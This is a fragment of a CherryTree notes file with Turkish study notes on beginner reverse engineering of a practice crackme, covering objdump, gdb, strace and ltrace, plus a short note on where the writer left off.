boyle kendi c programlarini yazip cracklemeye calis.
benzer challengelar crackme adi altinda crackmes.de'de var.
Kontrol grafikleri olusturmak anlamaya cok yardimci oluyor. Bunun icin programlar var.
1. Hopper Disassembler
2. IDA
3. radare
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
0x06
file ile dosyaya bakiyoruz, linux elf x64 dosyasi.
vim ile dosyayi aciyoruz allah allah okunmaz bir karmasa
sebebi ascii 0x7F e kadar yani 127ye kadar tanimli.
ancak bir byte 8 bit tutabiliyor yani 0-255 arasi.
ascii karakterleri yarim akilli amerikanin yarim byte kullanmasi yuzunden boyle.
Dolayisiyla dosyayi vimde acinca gordugun mavi karakterler, asciide printable karakterleri olmayan seyler (burasini liveoverflow biraz sıktı gibime geliyor)
objdump -d license_1
bunun icinden maini buluyoruz.

objdump -x license_1                # headerlari yazdiriyormus. Ilginc bisey var o da su. Stack icin falan permissionlar belirtiyor. Stack rw- mesela, executable degil. Buffer overflowda etkiliyormus bu durumu. Ilginc.

tam strcmp a gelip registerlari yazdirabiliyormussun
(gdb) x/s 0x40006da

strace          # can track system calls &amp; signals
C deki printf linuxta write(2) icin wrappermis sadece. Yani compile edilince ona donusuyor, bir syscall. (remember mips?)
man syscalls
ltrace          # library tracker for
</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="en son ne yapiyordum" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591201162.87" ts_lastsave="1591201163.89" unique_id="508">
		<rich_text>Tum nodelara bakip tutarsizliklari, agac formatini duzenliyordum. BURDA KALDIM isimli nodeda kalmistim.</rich_text>
	</node>
</cherrytree>
